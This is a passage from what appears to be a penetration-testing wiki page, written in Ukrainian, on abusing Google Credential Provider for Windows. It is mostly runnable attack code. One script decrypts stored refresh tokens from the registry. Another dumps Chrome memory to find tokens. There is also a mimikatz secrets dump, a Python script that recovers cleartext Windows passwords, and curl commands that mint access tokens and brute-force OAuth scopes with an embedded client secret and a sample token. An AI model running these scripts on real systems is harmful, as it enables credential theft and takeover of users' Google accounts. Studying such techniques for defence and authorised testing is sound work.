–ö—Ä—ñ–º —Ç–æ–≥–æ, —Ñ–∞–π–ª **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** —î json, —â–æ –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ä—ñ–∑–Ω—ñ **–Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è**, —Ç–∞–∫—ñ —è–∫ `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (—è–∫—â–æ –∫—ñ–ª—å–∫–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ Workspace –º–æ–∂—É—Ç—å —É–≤—ñ–π—Ç–∏ –Ω–∞ –∫–æ–º–ø'—é—Ç–µ—Ä) —Ç–∞ `validityPeriodDays` (–∫—ñ–ª—å–∫—ñ—Å—Ç—å –¥–Ω—ñ–≤, –ø—Ä–æ—Ç—è–≥–æ–º —è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–æ–≤—Ç–æ—Ä–Ω–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è –∑ Google –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ).

### GCPW - –¢–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ä–µ—î—Å—Ç—Ä—É

–£ —Ä–µ—î—Å—Ç—Ä—ñ **`HKCU:\SOFTWARE\Google\Accounts`** –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∑ **`refresh_token`**, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ. –ú–µ—Ç–æ–¥ **`ProtectedData.Unprotect`** –º–æ–∂–µ –ª–µ–≥–∫–æ –π–æ–≥–æ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏.

<details>

<summary>–û—Ç—Ä–∏–º–∞—Ç–∏ <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> –¥–∞–Ω—ñ —Ç–∞ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

–ü—Ä–∏–∫–ª–∞–¥ –≤–∏—Ö–æ–¥—É:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –≤—ñ–¥–µ–æ**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), —è–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞–π–¥–µ—Ç–µ —Ç–æ–∫–µ–Ω —É —Ä–µ—î—Å—Ç—Ä—ñ, –º–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è (–∞–±–æ –≤–∏–¥–∞–ª–∏—Ç–∏) –∑ **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** —ñ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞, –π–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –∑–Ω–æ–≤—É —É–≤—ñ–π—Ç–∏, –∞ **—Ç–æ–∫–µ–Ω –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–æ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–µ—î—Å—Ç—Ä—ñ**.

### GCPW - –¢–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–∏—Å–∫–∞

–§–∞–π–ª **`%LocalAppData%\Google\Chrome\User Data\Local State`** –∑–±–µ—Ä—ñ–≥–∞—î –∫–ª—é—á –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ **`refresh_tokens`**, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏—Ö —É **–ø—Ä–æ—Ñ—ñ–ª—è—Ö Google Chrome** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–∞–∫–∏—Ö —è–∫:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

–ú–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫–∏–π **C# –∫–æ–¥**, —â–æ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ —Ü–∏—Ö —Ç–æ–∫–µ–Ω—ñ–≤ —É —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–º—É –≤–∏–≥–ª—è–¥—ñ –≤ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ —Ü—å–æ–º—É –∫–æ–¥—ñ: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

–ú–æ–∂–Ω–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è AESGCM, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ **–≤–µ—Ä—Å—ñ—ó** (**`v10`** –Ω–∞ –¥–∞–Ω–∏–π –º–æ–º–µ–Ω—Ç), –ø–æ—Ç—ñ–º [**–º–∞—î 12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), –∞ –ø–æ—Ç—ñ–º –º–∞—î **—à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç** –∑ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–º **mac 16B**.

### GCPW - –í–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ –ø—Ä–æ—Ü–µ—Å—ñ–≤

–ù–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è** –∫–æ–∂–Ω–æ–≥–æ **–ø—Ä–æ—Ü–µ—Å—É Chrome** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `procdump`, –≤–∏—Ç—è–≥—Ç–∏ **—Ä—è–¥–∫–∏** —ñ –ø–æ—Ç—ñ–º **—à—É–∫–∞—Ç–∏** —Ä—è–¥–∫–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ **—Ç–æ–∫–µ–Ω–∞–º–∏ –¥–æ—Å—Ç—É–ø—É —Ç–∞ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è**. –Ø–∫—â–æ Chrome –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –¥–æ —è–∫–æ–≥–æ—Å—å —Å–∞–π—Ç—É Google, –¥–µ—è–∫—ñ **–ø—Ä–æ—Ü–µ—Å–∏ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º—É—Ç—å —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞/–∞–±–æ –¥–æ—Å—Ç—É–ø—É –≤ –ø–∞–º'—è—Ç—ñ!**

<details>

<summary>–í–∏—Ç—è–≥–Ω—É—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∏ Chrome —Ç–∞ —à—É–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

–Ø —Å–ø—Ä–æ–±—É–≤–∞–≤ —Ç–µ –∂ —Å–∞–º–µ –∑ `gcpw_extension.exe`, –∞–ª–µ –≤—ñ–Ω –Ω–µ –∑–Ω–∞–π—à–æ–≤ –∂–æ–¥–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞.

–ó —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏, **–¥–µ—è–∫—ñ –≤–∏—Ç—è–≥–Ω—É—Ç—ñ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É –Ω–µ –±—É–¥—É—Ç—å –¥—ñ–π—Å–Ω–∏–º–∏ (—Ö–æ—á–∞ –¥–µ—è–∫—ñ –±—É–¥—É—Ç—å)**. –Ø —Å–ø—Ä–æ–±—É–≤–∞–≤ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, —â–æ–± –≤–∏–¥–∞–ª—è—Ç–∏ —Å–∏–º–≤–æ–ª–∏ –ø–æ –æ–¥–Ω–æ–º—É, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥—ñ–π—Å–Ω–∏–π —Ç–æ–∫–µ–Ω –∑ –¥–∞–º–ø—É. –¶–µ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –¥–æ–ø–æ–º–∞–≥–∞–ª–æ –º–µ–Ω—ñ –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω–∏–π, –∞–ª–µ, –º–æ–∂–ª–∏–≤–æ, —Ü–µ –º–æ–∂–µ:

<details>

<summary>–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É, –≤–∏–¥–∞–ª—è—é—á–∏ —Å–∏–º–≤–æ–ª–∏ –ø–æ –æ–¥–Ω–æ–º—É</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - –í—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ

–©–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ GCPW –¥–ª—è –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ, –º–æ–∂–Ω–∞ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å –∑ **LSASS** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **mimikatz**:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
–¢–æ–¥—ñ —à—É–∫–∞–π—Ç–µ —Å–µ–∫—Ä–µ—Ç, —è–∫ `Chrome-GCPW-<sid>`, —è–∫ –Ω–∞ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

–ü–æ—Ç—ñ–º, –∑ **—Ç–æ–∫–µ–Ω–æ–º –¥–æ—Å—Ç—É–ø—É** –∑—ñ —Å—Ñ–µ—Ä–æ—é `https://www.google.com/accounts/OAuthLogin`, –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Ç–∞—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ –ø–∞—Ä–æ–ª—è:

<details>

<summary>–°–∫—Ä–∏–ø—Ç –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ, given the access token, encrypted password and resource id</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

–ú–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ –∫–ª—é—á–æ–≤—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ —Ü—å–æ–≥–æ –≤ –≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ Chromium:

* API –¥–æ–º–µ–Ω: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø—É –∑ —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–ª–∏–≤–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞ —ñ —Å–µ–∫—Ä–µ—Ç –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∫–æ–º–∞–Ω–¥—ñ:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å –º–∞—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –∂–æ–¥–Ω—É –æ–±–ª–∞—Å—Ç—å –¥–ª—è —Ç–æ–∫–µ–Ω–∞ –¥–æ—Å—Ç—É–ø—É, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ **–æ–±–ª–∞—Å—Ç—ñ, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–º, –≤ —è–∫–æ–º—É –≤–∏ –≥–µ–Ω–µ—Ä—É—î—Ç–µ —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É**.

–¢–∞–∫–æ–∂ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º —É –∫–æ–∂–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É.
{% endhint %}

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º GCPW –Ω–µ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ –∫–æ–∂–Ω–æ—ó –º–æ–∂–ª–∏–≤–æ—ó OAuth –æ–±–ª–∞—Å—Ç—ñ, —Ç–æ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ –æ–±–ª–∞—Å—Ç—ñ, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ `refresh_token` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

–Ü –æ—Å—å –≤–∏—Ö—ñ–¥, —è–∫–∏–π —è –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ Chromium, –º–æ–∂–Ω–∞ [**–∑–Ω–∞–π—Ç–∏ —Ü–µ–π —Ñ–∞–π–ª**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å **—ñ–Ω—à—ñ –æ–±–ª–∞—Å—Ç—ñ** , —è–∫—ñ –º–æ–∂–Ω–∞ –ø—Ä–∏–ø—É—Å—Ç–∏—Ç–∏, —â–æ **–Ω–µ –∑'—è–≤–ª—è—é—Ç—å—Å—è –≤ —Ä–∞–Ω—ñ—à–µ –∑–ª–∞–º–∞–Ω–æ–º—É —Å–ø–∏—Å–∫—É**. –û—Ç–∂–µ, —Ü—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –æ–±–ª–∞—Å—Ç—ñ –º–æ–∂–Ω–∞ –≤–≤–∞–∂–∞—Ç–∏:

<details>

<summary>–î–æ–¥–∞—Ç–∫–æ–≤—ñ –æ–±–ª–∞—Å—Ç—ñ</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
